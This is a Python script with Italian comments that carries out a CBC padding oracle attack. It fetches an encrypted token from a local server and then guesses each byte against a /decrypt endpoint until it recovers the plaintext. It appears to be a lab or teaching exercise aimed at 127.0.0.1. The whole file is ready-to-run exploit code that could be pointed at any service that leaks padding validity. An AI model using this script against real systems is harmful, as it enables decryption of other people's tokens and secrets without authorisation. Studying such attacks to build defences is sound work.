import base64
import requests
from Cryptodome.Util.Padding import pad, unpad



# Configurazione

BLOCK_SIZE = 8
SERVER = "http://127.0.0.1:5000"
#SERVER = "http://192.168.1.52:5000"


# Padding oracle che verifica se il plaintext è correttamente formattato in termini di padding PKCS#7

def oracle(ciphertext: bytes) -> bool:
    
    # se il plaintext è correttamente formattato in termini di padding il server restituisce lo status code 200

    token = base64.b64encode(ciphertext).decode()

    r = requests.post(
        f"{SERVER}/decrypt",
        json={"token": token}
    )

    return r.status_code == 200



# Suddivisione del ciphertext in blocchi da 8 byte

def split_blocks(data: bytes, size: int = 8):
    
    blocks = []
    
    # cicla attraverso i dati saltando di "size" byte alla volta
    for i in range(0, len(data), size):

        # estrae il blocco corrente (dall'indice i fino a i + size)
        current_block = data[i : i + size]
        blocks.append(current_block)
        
    return blocks



# Padding Oracle Attack

def decrypt_block(prev_block, current_block):
    
    intermediate = [0] * BLOCK_SIZE
    plaintext = [0] * BLOCK_SIZE

    for pad_value in range(1, BLOCK_SIZE + 1):
        
        # Inizializza 'crafted' ad ogni iterazione per ripartire puliti
        crafted = bytearray(prev_block)
        index = BLOCK_SIZE - pad_value

        # Aggiorna i byte gia trovati
        for j in range(BLOCK_SIZE - 1, index, -1):
            crafted[j] = intermediate[j] ^ pad_value

        # Prevenzione falsi positivi
        # Alteriamo il penultimo byte solo quando stiamo cercando 
        # Il primo byte di padding (pad_value == 1)
        if pad_value == 1 and index > 0:
            crafted[index - 1] ^= 0xFF

        found = False

        for guess in range(256): #brute force sui possibili valori di un byte (da 0 a 255)
            
            crafted[index] = guess

            forged = bytes(crafted) + current_block

            if oracle(forged): # se il padding è correttamente formattato

                # Calcolo intermediate byte
                intermediate[index] = guess ^ pad_value
                plaintext[index] = intermediate[index] ^ prev_block[index]

                # Per evitare stampe strane nel terminale se il carattere non è stampabile
                char_repr = chr(plaintext[index]) if 32 <= plaintext[index] <= 126 else '.'
                
                print(
                    f"Byte trovato [{index}] -> "
                    f"{plaintext[index]:02x} ({char_repr})"
                )

                found = True
                break

        if not found:
            raise Exception(f"Byte non trovato all'indice {index}")

    return bytes(plaintext)



# Main

def main():
    
    r = requests.get(f"{SERVER}/token")

    token_b64 = r.json()["token"]

    #print("\ntoken",token_b64)

    raw = base64.b64decode(token_b64)

    #print("\nraw", raw)

    blocks = split_blocks(raw, BLOCK_SIZE)

    print(f"Blocchi trovati: {len(blocks)-1} + l'iv")
    
    for i, b in enumerate(blocks):
        print(i, b.hex())

    plaintext = b""

    # cicla sui blocchi di cyphertext e li decifra usando l'attacco
    for i in range(1, len(blocks)):
        print(f"\nDecrittazione blocco {i}")

        p = decrypt_block(blocks[i - 1], blocks[i])
        plaintext += p


    # Rimozione del padding

    plaintext = unpad(plaintext, BLOCK_SIZE)
    print("\n[+] Plaintext recuperato:")
    print(plaintext)



if __name__ == "__main__":
    main()